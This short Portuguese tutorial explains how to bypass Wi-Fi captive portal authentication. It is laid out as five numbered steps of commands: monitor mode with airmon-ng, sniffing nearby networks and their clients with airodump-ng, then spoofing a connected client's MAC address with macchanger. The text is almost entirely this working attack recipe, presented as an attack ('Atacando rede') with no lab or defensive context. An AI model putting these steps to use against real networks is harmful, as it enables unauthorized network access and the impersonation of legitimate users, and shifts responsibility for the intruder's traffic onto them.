## Atacando rede com Captive Portal

Esse ataque é bem simples, para bypassar uma autenticação por Captive Portal geralmente a clonagem de mac address funciona...

#### 1° passo:

Colocar a placa em monitor mode

 ``` airmon-ng start <interface> ```

#### 2° passo:

Sniffar as redes ao redor e identificar o alvo

 ``` airodump-ng <interface> ```


#### 3° passo:

Focar o sniffing na rede alvo...(não é necessario capturar o trafego)

 ``` airodump-ng --essid NAME --channel CHANNEL <interface> -w CAPNAME ```

#### 4° passo:

Ver quais clientes estão conectados na rede com captive portal para podermos clonar algum mac.

Após de encontrar algum cliente conectado, salve o mac address desse cliente. Depois disso efetue a troca de mac address com a tool macchanger. 

 1 - ``` ifconfig <interface> down ```
 2 - ``` macchanger -m MACADDRCLONE <interface> ```
 3 - ``` ifconfig <interface> up ```

#### 5° passo:

Quando ja estiver com o mac address clonado verifique se você pode se conectar na rede e tem acesso a internet, para ter certeza de que a controladora da rede autorizou sua conexão
